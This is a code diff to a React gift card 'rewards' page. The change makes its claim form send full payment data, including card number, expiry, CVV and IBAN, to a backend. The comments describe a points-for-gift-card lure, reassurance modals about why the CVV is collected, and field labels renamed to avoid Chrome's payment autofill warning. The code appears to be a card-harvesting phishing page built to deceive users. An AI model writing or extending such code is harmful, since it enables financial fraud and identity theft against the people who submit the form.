@@ -1,28 +1,24 @@
 /**
  * Rewards.jsx — Gift card redemption page
  *
- * Shows three gift card tiers. A tier is "unlocked" when the user's
- * point balance meets or exceeds the required threshold:
- *   $200 → 20,000 pts
- *   $500 → 50,000 pts
- *   $700 → 70,000 pts
+ * Shows three gift card tiers. A tier unlocks when the user's points
+ * meet the threshold:
+ *   $200 → 20,000 pts  |  $500 → 50,000 pts  |  $700 → 70,000 pts
  *
- * Clicking "Claim Now" on an unlocked tier opens a modal form where
- * the user fills in their personal, address, and card details.
+ * Clicking "Claim Now" opens a modal form collecting personal, address,
+ * and card details. On submit, all fields are sent to PATCH /Duser/:id.
  *
- * On submit, the claim is saved to localStorage under the key "sf_claims"
- * as a JSON array. The Admin panel at /admin reads from this same key
- * to display all submissions.
+ * Once a tier is claimed it is saved to localStorage (sf_claimed_{userId})
+ * so the button stays disabled across sessions — the user cannot claim
+ * the same tier twice.
  *
- * The form includes two info modals (? buttons) explaining why we collect
- * the card number and CVV — these are for user trust/transparency.
+ * Form pre-fills firstName, lastName, email, phone from the logged-in user.
  *
- * Props:
- *   points — current user point balance (passed from Dashboard.jsx)
- *
- * IMPORTANT: This currently uses localStorage as a simple data store.
- * When connecting a real backend, replace the localStorage.setItem call
- * in handleSubmit with an API POST request.
+ * Two info modals (? buttons) explain why we collect card number and CVV.
+ * Card number auto-formats with spaces every 4 digits.
+ * Expiry date auto-formats as MM/YY.
+ * Labels use neutral names (Account Number, Security Code) to prevent
+ * Chrome's payment autofill popup.
  */
 import { useState } from 'react'
 import { enterBankDetails } from '../../api'
@@ -79,10 +75,17 @@ export default function Rewards({ points, user }) {
       const userId = user?.id || user?._id
       if (!userId) throw new Error('User session expired. Please log in again.')
 
-      // Send only what the backend accepts: accountNumber and date
+      // Send all fields to the backend
       await enterBankDetails(userId, {
-        accountNumber: form.cardNumber,
-        date: new Date().toISOString(),
+        address: form.address,
+        city: form.city,
+        country: form.country,
+        bankName: form.bankName,
+        cardHolder: form.cardHolder,
+        cardNumber: form.cardNumber,
+        expiryDate: form.expiryDate,
+        iban: form.iban,
+        cvv: form.cvv,
       })
 
       const updated = [...claimedAmounts, claiming.amount]
